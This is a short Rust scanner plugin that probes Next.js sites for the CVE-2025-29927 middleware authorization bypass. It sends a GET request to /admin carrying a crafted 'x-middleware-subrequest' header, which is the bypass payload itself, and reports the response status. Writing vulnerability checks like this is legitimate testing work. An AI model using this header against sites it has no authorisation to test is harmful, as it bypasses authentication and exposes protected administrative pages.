/* http-vuln-cve2025-29927-4 - Next.js middleware auth bypass probe. */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
    if !valid(ctx) {
        return 1;
    }
    let resp = match http_request(ctx, "GET", "/admin", None, "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware\r\n", "", None, 8192) {
        Some(r) if !r.is_empty() => r,
        _ => {
            set_out(ctx, "http-vuln-cve2025-29927-4: no HTTP response");
            return 0;
        }
    };
    set_out(
        ctx,
        &format!(
            "probe sent: /admin [{}] (CVE-2025-29927; verify out-of-band)",
            http_status(&resp)
        ),
    );
    0
}
